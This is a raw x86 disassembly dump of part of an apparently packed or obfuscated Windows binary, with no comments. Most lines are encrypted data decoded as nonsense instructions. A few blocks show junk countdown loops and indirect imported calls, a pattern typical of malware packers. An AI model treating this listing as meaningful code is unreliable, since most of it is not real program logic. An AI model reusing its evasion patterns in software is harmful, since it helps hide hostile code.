  406860:	stos   BYTE PTR es:[edi],al
  406861:	fsub   st(0),st
  406863:	mov    DWORD PTR [edx+0x42],eax
  406866:	cmp    DWORD PTR [ecx-0x3702d2d2],edi
  40686c:	push   ebp
  40686d:	sbb    al,0x13
  40686f:	dec    ebx
  406870:	pop    es
  406871:	dec    ebx
  406872:	call   0xa7a8:0x8e0d3cfa
  406879:	inc    edx
  40687a:	jae    0x406826
  40687c:	mov    ebp,0x57b6e24c
  406881:	sbb    DWORD PTR [esp+ecx*4-0x67b174bb],eax
  406888:	enter  0x5a0b,0xf1
  40688c:	inc    ebx
  40688d:	daa    
  40688e:	adc    bh,BYTE PTR [ebx+edx*8+0x6c612fd8]
  406895:	xchg   esi,eax
  406896:	stos   DWORD PTR es:[edi],eax
  406897:	jnp    0x4068bf
  406899:	mov    ch,0xe6
  40689b:	or     esi,DWORD PTR [ebx-0x636fb588]
  4068a1:	jle    0x40690c
  4068a3:	push   ebx
  4068a4:	(bad)  
  4068a5:	pinsrw mm4,WORD PTR [edi-0x4],0xe7
  4068aa:	sub    eax,0x5fb3968b
  4068af:	cmp    bh,BYTE PTR [edx]
  4068b1:	xor    DWORD PTR [edi],edx
  4068b3:	xchg   edi,eax
  4068b4:	fsubr  st,st(6)
  4068b6:	jmp    0x40686f
  4068b8:	pop    ds
  4068b9:	in     eax,0xe0
  4068bb:	psrlw  mm0,QWORD PTR [ecx-0x3a4034ac]
  4068c2:	xchg   esp,eax
  4068c3:	sub    esi,esp
  4068c5:	in     eax,dx
  4068c6:	jno    0x406941
  4068c8:	sub    edx,ebp
  4068ca:	xor    DWORD PTR [edi],edx
  4068cc:	inc    eax
  4068cd:	test   DWORD PTR [ebp+0x6e39791a],edi
  4068d3:	icebp  
  4068d4:	pop    ebp
  4068d5:	ret    0x18
  4068d8:	push   ebp
  4068d9:	mov    ebp,esp
  4068db:	sub    esp,0x58
  4068de:	mov    DWORD PTR ds:0x42a7dd,0x1f
  4068e8:	cmp    DWORD PTR ds:0x42a7dd,0x0
  4068ef:	je     0x406947
  4068f5:	cmp    DWORD PTR ds:0x42a7dd,0x8
  4068fc:	jne    0x406916
  406902:	push   DWORD PTR [ebp-0x1c]
  406905:	push   DWORD PTR [ebp-0x24]
  406908:	push   0x42aaca
  40690d:	push   DWORD PTR [ebp-0x10]
  406910:	call   DWORD PTR ds:0x41d18c
  406916:	cmp    DWORD PTR ds:0x42a7dd,0x9
  40691d:	jne    0x406931
  406923:	xor    eax,eax
  406925:	or     eax,DWORD PTR ds:0x42a7dd
  40692b:	dec    eax
  40692c:	mov    ds:0x42a7dd,eax
  406931:	mov    eax,ds:0x42a7dd
  406936:	dec    eax
  406937:	mov    ds:0x42a7dd,eax
  40693c:	jmp    0x4068e8
  406941:	and    DWORD PTR ds:0x42a789,edx
  406947:	mov    ecx,DWORD PTR [ebp+0x8]
  40694a:	jmp    0x406c53
  40694f:	int3   
  406950:	(bad)
  406953:	(bad)  
  406955:	fcmove st,st(1)
  406957:	in     eax,dx
  406958:	loop   0x406947
  40695a:	out    dx,eax
  40695b:	enter  0x4c15,0xc7
  40695f:	add    cl,cl
  406961:	js     0x4069db
  406963:	fs jle 0x4069de
  406966:	js     0x4069a4
  406968:	jle    0x4069c8
  40696a:	sbb    dl,cl
  40696c:	int3   
  40696d:	push   ds
  40696e:	push   ds
  40696f:	ror    cl,1
  406971:	(bad)  
  406972:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406973:	shl    DWORD PTR [ebp+0x69cc937],1
  406979:	mov    eax,0x1184bdc7
  40697e:	mov    BYTE PTR [edi],bl
  406980:	test   BYTE PTR [ebx+0x6caaeec],dh
  406986:	fdiv   QWORD PTR [ebx+0x6f5106fe]
  40698c:	cmp    al,0x21
  40698e:	mov    eax,ds:0x67dfd976
  406993:	inc    edi
  406994:	xchg   edi,eax
  406995:	test   DWORD PTR [edi],eax
  406997:	xor    ebp,ebx
  406999:	out    dx,al
  40699a:	jge    0x406996
  40699c:	push   ds
  40699d:	mov    edx,0x74587a32
  4069a2:	xor    BYTE PTR [ecx],al
  4069a4:	pop    ds
  4069a5:	xor    BYTE PTR [ecx-0x1],ch
  4069a8:	push   ebp
  4069a9:	enter  0xdb89,0x81
  4069ad:	jb     0x4069d0
  4069af:	dec    eax
  4069b0:	mov    ecx,0xa89ffac2
  4069b5:	xchg   edx,eax
  4069b6:	mov    edi,0x266d6469
  4069bb:	mov    ebp,0xbed0b62
  4069c0:	xor    ebp,DWORD PTR [edi-0x1dfe7a1e]
  4069c6:	cmp    BYTE PTR [edx],ah
  4069c8:	fwait
  4069c9:	(bad)  
  4069ca:	mov    ds:0x2a1c01be,al
  4069cf:	stc    
  4069d0:	fist   WORD PTR [ebx+0x7e9730cd]
  4069d6:	mov    ch,0x9a
  4069d8:	xchg   esp,eax
  4069d9:	aas    
  4069da:	jnp    0x4069f0
  4069dc:	mov    WORD PTR [ecx],?
  4069de:	fisub  WORD PTR [eax+0x3ed94638]
  4069e4:	ja     0x40696f
  4069e6:	lods   eax,DWORD PTR ds:[esi]
  4069e7:	mov    bh,0x78
  4069e9:	(bad)  
  4069ea:	mov    ds:0x93f8eea7,eax
  4069ef:	xchg   ebx,eax
  4069f0:	leave  
  4069f1:	and    dh,BYTE PTR [edx+0x7b79b549]
  4069f7:	pop    esi
  4069f8:	xchg   edi,eax
  4069f9:	sub    al,0x5d
  4069fb:	test   al,0xe5
  4069fd:	es ds xchg edi,eax
  406a00:	push   es
  406a01:	aad    0x7
  406a03:	and    eax,esi
  406a05:	out    0x78,eax
  406a07:	xor    BYTE PTR [edi],bh
  406a09:	call   FWORD PTR [ecx+eiz*8-0x58]
  406a0d:	sub    al,0x90
  406a0f:	push   cs
  406a10:	jo     0x406a03
  406a12:	fdivr  DWORD PTR [ebp-0x52255b4c]
  406a18:	in     al,dx
  406a19:	or     edi,esi
  406a1b:	push   es
  406a1c:	hlt    
  406a1d:	jp     0x4069a9
  406a1f:	int    0x8f
  406a21:	div    DWORD PTR [edx]
  406a23:	je     0x406a4d
  406a25:	inc    esp
  406a26:	push   esi
  406a27:	adc    al,0x64
  406a29:	mov    bl,0xd8
  406a2b:	dec    edx
  406a2c:	sar    BYTE PTR [esi],cl
  406a2e:	push   ebx
  406a2f:	mov    ecx,0x8aba112b
  406a34:	ss jmp 0x44e58788
  406a3a:	xchg   edx,eax
  406a3b:	pusha  
  406a3c:	and    eax,0xf8a08424
  406a41:	popa   
  406a42:	lods   eax,DWORD PTR ds:[esi]
  406a43:	pusha  
  406a44:	lea    ecx,[edi]
  406a46:	xchg   BYTE PTR [edi+0x45],ah
  406a49:	nop
  406a4a:	lods   eax,DWORD PTR ds:[esi]
  406a4b:	test   DWORD PTR [edi],esp
  406a4d:	js     0x406a12
  406a4f:	out    dx,al
  406a50:	into   
  406a51:	dec    esi
  406a52:	in     eax,0xb9
  406a54:	ror    DWORD PTR [eax-0x1d6f9ed2],0xe2
  406a5b:	and    eax,0xce749dad
  406a60:	jp     0x406a0d
  406a62:	aas    
  406a63:	jne    0x406a79
  406a65:	test   al,0xde
  406a67:	push   cs
  406a68:	xchg   edi,eax
  406a69:	mov    al,ds:0xbd5c1a4b
  406a6e:	mov    eax,0x68438584
  406a73:	adc    dh,BYTE PTR [edx-0x45]
  406a76:	out    0x11,al
  406a78:	(bad)  
  406a79:	fisttp WORD PTR [edi+0x57]
  406a7c:	mov    ?,WORD PTR [esi]
  406a7e:	cmp    ebx,0xffffffe1
  406a81:	mov    edi,0xac08951b
  406a86:	mov    ds:0x6e9951b4,al
  406a8b:	cmp    al,0xb6
  406a8d:	loope  0x406a4e
  406a8f:	inc    ebx
  406a90:	pop    eax
  406a91:	adc    BYTE PTR [edx+edx*2-0x4783041f],0xc5
  406a99:	pop    es
  406a9a:	mov    es,WORD PTR [ecx+0x56]
  406a9d:	int3   
  406a9e:	imul   edx,DWORD PTR [edx-0x13],0x692440ce
  406aa5:	xchg   DWORD PTR [ebx+0x69],ebx
  406aa8:	out    0xf2,eax
  406aaa:	mov    esi,0x642bd95e
  406aaf:	jp     0x406a6c
  406ab1:	dec    ebp
  406ab2:	out    0xc1,eax
  406ab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ab5:	es in  al,0x3e
  406ab8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ab9:	xlat   BYTE PTR ds:[ebx]
  406aba:	pop    ebp
  406abb:	cmp    BYTE PTR [edi],ah
  406abd:	adc    DWORD PTR [ecx+0x75],ebx
  406ac0:	mov    eax,ds:0xaaf3ee0d
  406ac5:	xchg   eax,esi
  406ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ac8:	jecxz  0x406a8e
  406aca:	push   edx
  406acb:	sahf   
  406acc:	stos   DWORD PTR es:[edi],eax
  406acd:	fcmovnb st,st(3)
  406acf:	lods   eax,DWORD PTR ds:[esi]
  406ad0:	aam    0x12
  406ad2:	frstor [edx-0x110f941c]
  406ad8:	pop    ss
  406ad9:	xchg   edi,eax
  406ada:	mov    ebp,0x736b2b2
  406adf:	outs   dx,BYTE PTR ds:[esi]
  406ae0:	xchg   DWORD PTR [ebp+0x20],esp
  406ae3:	mov    eax,0x4ba4d06d
  406ae8:	out    dx,al
  406ae9:	mov    ebx,0x4c894664
  406aee:	fnstcw WORD PTR [edx-0x4c8592ef]
  406af4:	test   BYTE PTR [ebx],ah
  406af6:	ja     0x406b64
  406af8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406af9:	adc    DWORD PTR [edx],ebp
  406afb:	mov    ds:0xeeb09668,eax
  406b00:	mov    al,ds:0x49ca10da
  406b05:	or     DWORD PTR [ebx+0x55],edi
  406b08:	jns    0x406af0
  406b0a:	jo     0x406ae0
  406b0c:	sbb    bh,BYTE PTR [ebx-0x14]
  406b0f:	outs   dx,DWORD PTR ds:[esi]
  406b10:	ret    
  406b11:	mov    ecx,0xd0b0a9be
  406b16:	sub    ecx,DWORD PTR [edx]
  406b18:	(bad)  
  406b1a:	pop    esi
  406b1b:	xor    ebp,esp
  406b1d:	ss add al,0x3f
  406b20:	(bad)  
  406b21:	mov    esi,0x6cae462f
  406b26:	jb     0x406b2f
  406b28:	ret    0xcedc
  406b2b:	(bad)  
  406b2c:	jmp    0x10e8:0x92bbe5e2
  406b33:	pop    ds
  406b34:	add    eax,0x245c38c9
  406b39:	cli    
  406b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b3b:	nop
  406b3c:	sub    esp,DWORD PTR [edi-0x250a46d9]
  406b42:	and    BYTE PTR [edx+0x20],bh
  406b45:	std    
  406b46:	inc    ebp
  406b47:	xchg   edx,eax
  406b48:	mov    BYTE PTR ds:0xabd676fa,al
  406b4e:	pop    eax
  406b4f:	and    esp,esp
  406b51:	int3   
  406b52:	test   bl,al
  406b54:	iret   
  406b55:	jp     0x406bc9
  406b57:	sahf   
  406b58:	and    eax,0x4664e0bc
  406b5d:	(bad)  
  406b5e:	shr    BYTE PTR [edx-0x524541e4],cl
  406b64:	jmp    0xefe6:0xc996006c
  406b6b:	sub    ebx,DWORD PTR [ebx-0x74]
  406b6e:	scas   eax,DWORD PTR es:[edi]
  406b6f:	loop   0x406af8
  406b71:	push   0xa69d73d1
  406b76:	cdq    
  406b77:	iret   
  406b78:	pop    edi
  406b79:	test   al,0xe4
  406b7b:	jns    0x406b1b
  406b7d:	xchg   ebx,eax
  406b7e:	inc    ebx
  406b7f:	fwait
  406b80:	call   0x2c8c:0xc4d0a016
  406b87:	pop    eax
  406b88:	aas    
  406b89:	mov    ah,0x39
  406b8b:	push   ds
  406b8c:	jae    0x406bc3
  406b8e:	aad    0x1b
  406b90:	int3   
  406b91:	sub    cl,al
  406b93:	xchg   edi,eax
  406b94:	in     al,0x7c
  406b96:	jecxz  0x406b9a
  406b98:	loope  0x406ba7
  406b9a:	add    al,0x94
  406b9c:	sahf   
  406b9d:	es dec ebx
  406b9f:	inc    edx
  406ba0:	arpl   WORD PTR [esi+0x6bca4b],dx
  406ba6:	mov    ds:0xef178b1,eax
  406bab:	dec    ebx
  406bac:	ror    BYTE PTR [edx-0x2d9dec6f],1
  406bb2:	aaa    
  406bb3:	cmp    edx,DWORD PTR [esi]
  406bb5:	dec    esp
  406bb6:	out    dx,eax
  406bb7:	call   0x8ae0f6d8
  406bbc:	and    al,0x48
  406bbe:	xchg   BYTE PTR [ecx+0x21],cl
  406bc1:	adc    eax,0x34490df7
  406bc6:	mov    dx,0x6320
  406bca:	push   ds
  406bcb:	sub    al,0xe6
  406bcd:	adc    BYTE PTR [ebx-0x6d],dl
  406bd0:	adc    esp,ebp
  406bd2:	add    DWORD PTR [edi-0x6fb91f37],edi
  406bd8:	or     BYTE PTR [ebx+esi*1+0x2c],bh
  406bdc:	pop    DWORD PTR [edi+0x1a]
  406bdf:	dec    edx
  406be0:	jl     0x406c4f
  406be2:	stc    
  406be3:	push   0x58265727
  406be8:	pop    edx
  406be9:	jecxz  0x406b7e
  406beb:	add    DWORD PTR [eiz*4-0x171e5b20],ebp
  406bf2:	fwait
  406bf3:	fs jbe 0x406baf
  406bf6:	mov    al,ds:0xac3da8ec
  406bfb:	fs (bad) 
  406bfe:	fwait
  406bff:	push   es
  406c00:	outs   dx,BYTE PTR ds:[esi]
  406c01:	imul   ebx,DWORD PTR [ecx-0x35],0x7d
  406c05:	push   0xc
  406c07:	xchg   DWORD PTR [esp+edi*8+0x2a],edi
  406c0b:	dec    edi
  406c0c:	jbe    0x406c75
  406c0e:	and    bh,ch
  406c10:	mov    dl,0x1b
  406c12:	mov    ds:0x48dd9e95,eax
  406c17:	pop    ss
  406c18:	push   ebp
  406c19:	mov    ebx,0xefc9b4b0
  406c1e:	mov    bh,0x32
  406c20:	or     DWORD PTR [edx+0x56],0x34
  406c24:	adc    eax,0x64b116ba
  406c29:	hlt    
  406c2a:	leave  
  406c2b:	iret   
  406c2c:	dec    edx
  406c2d:	push   eax
  406c2e:	mov    ah,0xc7
  406c30:	pop    edx
  406c31:	bound  eax,QWORD PTR [eax]
  406c33:	cwde   
  406c34:	and    edx,DWORD PTR [edx*4-0x1f176a3e]
  406c3b:	dec    edx
  406c3c:	addr16 call eax
  406c3f:	lods   al,BYTE PTR ds:[esi]
  406c40:	pop    ds
  406c41:	dec    ecx
  406c42:	jl     0x406c36
  406c44:	mov    esp,0xd10b4b0e
  406c49:	jmp    0x406c26
  406c4b:	fs ret 
  406c4d:	lock inc edx
  406c4f:	push   edi
  406c50:	in     eax,0xdb
  406c52:	xchg   BYTE PTR [eax+0x8a36],bh
  406c58:	adc    DWORD PTR ds:0x42a7e9,0x4fea
  406c62:	xor    ax,WORD PTR [ecx+0x20]
  406c66:	sub    DWORD PTR ds:0x42a815,0x417a
  406c70:	mov    ecx,0x3afc
  406c75:	xor    DWORD PTR ds:0x42a86d,0x2c9d
  406c7f:	jmp    0x406f88
  406c84:	rol    dh,cl
  406c86:	cmp    al,0xd3
  406c88:	aam    0xd9
  406c8a:	rol    ebp,1
  406c8c:	mov    eax,ebx
  406c8e:	and    DWORD PTR [ecx+0x67],ebx
  406c91:	iret   
  406c92:	shl    DWORD PTR [ebx+0x6c],1
  406c95:	iret   
  406c96:	js     0x406d10
  406c98:	fs jle 0x406d13
  406c9b:	js     0x406cce
  406c9d:	xchg   ebp,eax
  406c9e:	push   ebx
  406c9f:	fisubr DWORD PTR [eax+0x29]
  406ca2:	test   eax,0x1c5ce58b
  406ca7:	pop    esi
  406ca8:	sub    esp,DWORD PTR [edx+0x3e12c711]
  406cae:	push   cs
  406caf:	pop    es
  406cb0:	neg    DWORD PTR [ebx+0x26]
  406cb3:	xchg   esi,eax
  406cb4:	sbb    cl,bl
  406cb6:	fild   WORD PTR [edi-0x7d09d006]
  406cbc:	xor    al,0xab
  406cbe:	inc    esp
  406cbf:	sub    DWORD PTR [ecx-0x17],0xffffffdb
  406cc3:	xchg   ebp,eax
  406cc4:	ja     0x406cbc
  406cc6:	div    DWORD PTR ds:0x242a348a
  406ccc:	and    ch,al
  406cce:	mov    edx,0x58962fd5
  406cd3:	add    eax,0x9f8ba8ae
  406cd8:	sub    al,0xc3
  406cda:	int    0x7b
  406cdc:	outs   dx,DWORD PTR ds:[esi]
  406cdd:	call   0x20323b
  406ce2:	sbb    al,0x34
  406ce4:	push   eax
  406ce5:	ss jnp 0x406c77
  406ce8:	ss push 0xd0fe10f1
  406cee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cef:	out    dx,al
  406cf0:	retf   0x802e
  406cf3:	in     eax,0x93
  406cf5:	pop    ecx
  406cf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cf7:	push   es
  406cf8:	sbb    ecx,DWORD PTR [eax-0x43]
  406cfb:	push   esp
  406cfc:	loope  0x406c9f
  406cfe:	leave  
  406cff:	push   esi
  406d00:	les    ecx,FWORD PTR [edi+0x52caf445]
  406d06:	retf   
  406d07:	mov    dh,0xbf
  406d09:	mov    ebp,0xcf7dcbdc
  406d0e:	push   0x7d
  406d10:	bound  edi,QWORD PTR ss:[esi+ebx*1]
  406d14:	(bad)  
  406d15:	fnstenv [ecx+0x1b]
  406d18:	push   ebp
  406d19:	scas   al,BYTE PTR es:[edi]
  406d1a:	addr16 icebp 
  406d1c:	dec    edx
  406d1d:	hlt    
  406d1e:	push   edx
  406d1f:	sbb    eax,0x592d40f6
  406d24:	mov    esi,0x8d187eb5
  406d29:	cli    
  406d2a:	loopne 0x406d14
  406d2c:	xor    eax,DWORD PTR [eax]
  406d2e:	test   al,bh
  406d30:	mov    ds:0xe31f4131,eax
  406d35:	icebp  
  406d36:	call   0xd14e634a
  406d3b:	outs   dx,BYTE PTR ds:[esi]
  406d3c:	sub    edi,0xffffffec
  406d3f:	repnz xchg edx,eax
  406d41:	pop    ebp
  406d42:	fimul  DWORD PTR [ebp-0x272b293d]
  406d48:	push   esp
  406d49:	push   DWORD PTR [ebx]
  406d4b:	xchg   esi,eax
  406d4c:	loopne 0x406d19
  406d4e:	mov    ebp,0xf31423b9
  406d53:	fadd   DWORD PTR [edi+0x745350a2]
  406d59:	sub    ebp,DWORD PTR [esi-0x3cd2eb8e]
  406d5f:	outs   dx,BYTE PTR ds:[esi]
  406d60:	ins    DWORD PTR es:[edi],dx
  406d61:	out    dx,eax
  406d62:	mov    BYTE PTR [ebp+0x25],dh
  406d65:	(bad)  
  406d66:	and    ebp,esi
  406d68:	fld    TBYTE PTR ss:[edx-0x72193579]
  406d6f:	adc    ebx,edi
  406d71:	int    0xbb
  406d73:	xchg   ebp,eax
  406d74:	(bad)  
  406d75:	mov    edi,0x5b98b2
  406d7a:	mov    ebp,0x8b797944
  406d7f:	mov    gs,WORD PTR [ebx]
  406d81:	add    al,0x7c
  406d83:	and    DWORD PTR [ebx+0x4473d964],eax
  406d89:	mov    bl,BYTE PTR ds:0x6713455c
  406d8f:	cmp    BYTE PTR [ebp-0x21],cl
  406d92:	aaa    
  406d93:	mov    BYTE PTR [eax],ah
  406d95:	ja     0x406dce
  406d97:	pop    esi
  406d99:	sbb    DWORD PTR [eax],esi
  406d9b:	pop    ecx
  406d9c:	pop    esp
  406d9d:	test   al,0x60
  406d9f:	xor    esi,ecx
  406da1:	xchg   ecx,eax
  406da2:	sbb    bh,dl
  406da4:	cmp    esp,DWORD PTR [esi-0x2fe3ebc2]
  406daa:	fbstp  TBYTE PTR [ebp+0x11]
  406dad:	xor    DWORD PTR [ebx+0x43],edx
  406db0:	loopne 0x406dd0
  406db2:	mov    ds:0x7b740ff4,al
  406db7:	sub    cl,BYTE PTR [esi+edx*2]
  406dba:	add    al,0xcc
  406dbc:	ret    0x807
  406dbf:	push   ebp
  406dc0:	mov    eax,ds:0x33849933
  406dc5:	cmove  esi,DWORD PTR [ecx+0x48]
  406dc9:	mov    bh,0x51
  406dcb:	test   al,0xa6
  406dcd:	pusha  
  406dce:	mov    eax,ds:0xbac9589a
  406dd3:	imul   esi,DWORD PTR [edi+0x5a],0x7c
  406dd7:	pop    edi
  406dd8:	jae    0x406df9
  406dda:	aas    
  406ddb:	and    ah,BYTE PTR fs:[ebx]
  406dde:	jle    0x406e33
  406de0:	stos   DWORD PTR es:[edi],eax
  406de1:	(bad)  
  406de3:	mov    ebp,0xa550c4d7
  406de8:	push   eax
  406de9:	lea    ecx,[ebx*8+0x71a4302]
  406df0:	jmp    0x6395354b
  406df5:	xor    bl,BYTE PTR [edi+0x54614638]
  406dfb:	jmpw   0x212e
  406dff:	mov    ch,0xe1
  406e01:	add    ah,al
  406e03:	push   es
  406e04:	cmp    ch,ch
  406e06:	out    dx,al
  406e07:	pop    ds
  406e08:	fsub   DWORD PTR [ebx+0x34126e17]
  406e0e:	push   esp
  406e0f:	call   0x93c6:0x18286e5
  406e16:	nop
  406e17:	jnp    0x406da2
  406e19:	sbb    eax,0xc4346e3e
  406e1e:	lahf   
  406e1f:	xchg   ebx,eax
  406e20:	mov    bl,0x85
  406e22:	hlt    
  406e23:	aas    
  406e24:	xor    BYTE PTR [edx+0x79c14b2a],bh
  406e2a:	pop    ds
  406e2b:	int3   
  406e2c:	pop    ecx
  406e2d:	loop   0x406e6a
  406e2f:	mov    esi,ebx
  406e31:	sar    DWORD PTR [esi],0xff
  406e34:	pop    ebx
  406e35:	cdq    
  406e36:	mov    al,0x2a
  406e38:	cli    
  406e39:	mov    ch,0x0
  406e3b:	jbe    0x406e36
  406e3d:	jo     0x406e10
  406e3f:	xchg   ecx,eax
  406e40:	lea    ebx,[eax-0x605b0042]
  406e46:	scas   eax,DWORD PTR es:[edi]
  406e47:	mov    al,0xf1
  406e49:	hlt    
  406e4a:	lahf   
  406e4b:	pop    ebp
  406e4c:	mov    al,ds:0x2bed9539
  406e51:	mov    DWORD PTR [ebp-0x7a],edi
  406e54:	rcr    DWORD PTR [edi+0xcfc5217],1
  406e5a:	lahf   
  406e5b:	lahf   
  406e5c:	mov    eax,0xf5350aa7
  406e61:	rcl    DWORD PTR [edx-0x69],cl
  406e64:	cmovs  edi,DWORD PTR gs:[di+0x5707]
  406e6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e6c:	add    cl,bl
  406e6e:	xor    ebx,DWORD PTR [ebx+0x12bff01b]
  406e74:	or     DWORD PTR [edx+eax*8+0x27d34b6f],ecx
  406e7b:	jae    0x406ed5
  406e7d:	shld   DWORD PTR [esi-0x130c9be7],edx,0xcf
  406e85:	(bad)  [edx+eax*1-0x1e]
  406e89:	mov    ds:0x5fe0d66f,al
  406e8e:	mul    ah
  406e90:	inc    ebx
  406e91:	sub    dl,dl
  406e93:	cmp    DWORD PTR [edi-0x6286d71f],ebx
  406e99:	scas   al,BYTE PTR es:[edi]
  406e9a:	pop    bx
  406e9c:	sbb    BYTE PTR [ebx-0x3adb7f60],dl
  406ea2:	pop    ds
  406ea3:	add    ch,bl
  406ea5:	and    edi,DWORD PTR [edx+edi*2]
  406ea8:	add    DWORD PTR [ebp+0x77],ebx
  406eab:	pop    es
  406eac:	loopne 0x406e3a
  406eae:	xchg   esi,eax
  406eaf:	mov    BYTE PTR [edx+ecx*1-0x472df3dd],0x44
  406eb7:	xchg   ebp,eax
  406eb8:	mov    ebx,0x2f1286ce
  406ebd:	ss sbb eax,0xe01e1071
  406ec3:	sub    ebx,DWORD PTR [ecx]
  406ec5:	push   cs
  406ec6:	xor    bh,BYTE PTR [eax-0x7abd10b4]
  406ecc:	push   ebx
  406ecd:	popf   
  406ece:	jecxz  0x406e59
  406ed0:	jmp    0xb73311c4
  406ed5:	fwait
  406ed6:	dec    esp
  406ed7:	fst    DWORD PTR [esi]
  406ed9:	loop   0x406eec
  406edb:	fcom   QWORD PTR [esi+0x3423d01f]
  406ee1:	dec    ebx
  406ee2:	and    edx,DWORD PTR [ecx]
  406ee4:	out    dx,eax
  406ee5:	inc    eax
  406ee6:	xor    al,0x44
  406ee8:	dec    esp
  406ee9:	push   es
  406eea:	mov    DWORD PTR [ebp+eiz*4-0x4f],edx
  406eee:	or     BYTE PTR [edi-0x6d76c314],ch
  406ef4:	iret   
  406ef5:	mov    cl,0x0
  406ef7:	sbb    eax,0xdebf02b6
  406efc:	add    DWORD PTR [ebx-0x75],0xb0829574
  406f03:	mov    ecx,0x6bb71ac2
  406f08:	mov    ds:0xc941db19,al
  406f0d:	mov    dh,0xed
  406f0f:	test   DWORD PTR [ecx],ebx
  406f11:	jg     0x406ef2
  406f13:	into   
  406f14:	test   eax,0xb58def93
  406f19:	xchg   esi,eax
  406f1a:	push   ecx
  406f1b:	ins    DWORD PTR es:[edi],dx
  406f1c:	xchg   edx,eax
  406f1d:	aad    0x16
  406f1f:	dec    ecx
  406f20:	ss push edi
  406f22:	popf   
  406f23:	add    al,0xef
  406f25:	mov    ds:0x4f348d9,eax
  406f2a:	push   ss
  406f2b:	sbb    DWORD PTR [ebx-0x4e],edi
  406f2e:	(bad)  
  406f2f:	push   0xffffffd8
  406f31:	aad    0xb
  406f33:	in     eax,0x4e
  406f35:	add    ecx,DWORD PTR [edi]
  406f37:	jecxz  0x406ec5
  406f39:	adc    al,0x8a
  406f3b:	adc    al,0x12
  406f3d:	aam    0xbc
  406f3f:	repz sub BYTE PTR [ebp+0x3],0x14
  406f44:	and    BYTE PTR [ebx-0x7271abf7],al
  406f4a:	jmp    0x79d041bf
  406f4f:	(bad)  
  406f50:	js     0x406fcd
  406f52:	rol    DWORD PTR [esp+ebp*8],cl
  406f55:	test   eax,0x4c1c2a50
  406f5a:	mov    ecx,0xc288406c
  406f5f:	dec    esi
  406f60:	and    eax,0xb781ff71
  406f65:	dec    edi
  406f66:	sar    DWORD PTR [ebp+ebx*2+0x2ba78e72],1
  406f6d:	scas   eax,DWORD PTR es:[edi]
  406f6e:	cmp    al,0xc5
  406f70:	add    DWORD PTR [edi+esi*4],esi
  406f73:	adc    edi,esp
  406f75:	mov    esi,0x6305ea40
  406f7a:	arpl   WORD PTR [esp+edx*4],dx
  406f7d:	fdivr  QWORD PTR [ecx+0x3f782614]
  406f83:	les    eax,FWORD PTR [edx+eax*4+0x7d]
  406f87:	pop    es
  406f88:	add    ax,cx
  406f8b:	sbb    ecx,DWORD PTR ds:0x42a8a1
  406f91:	movzx  eax,ax
  406f94:	and    DWORD PTR ds:0x42a8a5,0x0
  406f9e:	jmp    0x406fb0
  406fa3:	mov    ecx,DWORD PTR ds:0x42a8a5
  406fa9:	inc    ecx
  406faa:	mov    DWORD PTR ds:0x42a8a5,ecx
  406fb0:	cmp    DWORD PTR ds:0x42a8a5,0x11
  406fb7:	jae    0x407009
  406fbd:	cmp    DWORD PTR ds:0x42a8a5,0x7
  406fc4:	jne    0x406fe4
  406fca:	push   0x2396
  406fcf:	push   0x42ab42
  406fd4:	push   0x42ab42
  406fd9:	push   0x42ab24
  406fde:	call   DWORD PTR ds:0x41d190
  406fe4:	cmp    DWORD PTR ds:0x42a8a5,0x6
  406feb:	jne    0x406ffe
  406ff1:	mov    ecx,DWORD PTR ds:0x42a8a5
  406ff7:	inc    ecx
  406ff8:	mov    DWORD PTR ds:0x42a8a5,ecx
  406ffe:	jmp    0x406fa3
  407003:	adc    DWORD PTR ds:0x42a7e9,edx
  407009:	mov    DWORD PTR [ebp-0xc],eax
  40700c:	xor    ecx,ecx
  40700e:	add    ecx,DWORD PTR ds:0x42a78d
  407014:	sub    DWORD PTR ds:0x42a861,ecx
  40701a:	jmp    0x407323
  40701f:	cmp    al,0xc4
  407021:	(bad)  
  407022:	rcl    dh,cl
  407024:	rol    ah,cl
  407026:	ficom  DWORD PTR [esi+ebp*2-0xc]
  40702a:	out    0xf6,al
  40702c:	xlat   BYTE PTR ds:[ebx]
  40702d:	std    
  40702e:	push   ds
  40702f:	pop    eax
  407030:	int3   
  407031:	js     0x4070ab
  407033:	fs jle 0x4070ae
  407036:	js     0x407058
  407038:	cmp    BYTE PTR [esi+0x23fa445f],0xbc
  40703f:	mov    bl,0xe1
  407041:	jp     0x407069
  407043:	jle    0x40706e
  407045:	aaa    
  407046:	cmp    DWORD PTR [esi+0x7ce1bb22],esp
  40704c:	imul   edx,DWORD PTR [ebx+0x6602f8bc],0xae08e57f
  407056:	int    0xc8
  407058:	xor    al,cl
  40705a:	push   0x74
  40705c:	(bad)  
  40705d:	ror    BYTE PTR [eax],1
  40705f:	shl    BYTE PTR [edx+0xfcaff44],0xd7
  407066:	inc    edx
  407067:	xor    ch,0x78
  40706a:	xchg   ecx,eax
  40706b:	dec    esi
  40706c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40706d:	fdivr  st(4),st
  40706f:	pop    ds
  407070:	jmp    0x4070e1
  407072:	mov    bh,dh
  407074:	test   DWORD PTR [ebx+0x56],eax
  407077:	pop    ds
  407078:	adc    BYTE PTR [esi+0x2c1b1b09],dl
  40707e:	popf   
  40707f:	fidivr WORD PTR [ebp+0x4d]
  407082:	fistp  QWORD PTR [esi]
  407084:	test   DWORD PTR [ecx-0x48],esi
  407087:	and    cl,BYTE PTR [edi]
  407089:	mov    al,ah
  40708b:	ret    0x446f
  40708e:	fadd   QWORD PTR [ecx]
  407090:	mov    al,0x3c
  407092:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407093:	or     edi,DWORD PTR [edx+0x42190ae9]
  407099:	out    0xce,eax
  40709b:	imul   edi,DWORD PTR [ecx],0x3cbd1de4
  4070a1:	into   
  4070a2:	dec    eax
  4070a3:	arpl   WORD PTR [esi-0x4431db9b],cx
  4070a9:	outs   dx,BYTE PTR ds:[esi]
  4070aa:	adc    DWORD PTR ds:0xffae57d8,ecx
  4070b0:	mov    al,ds:0x3d4bc217
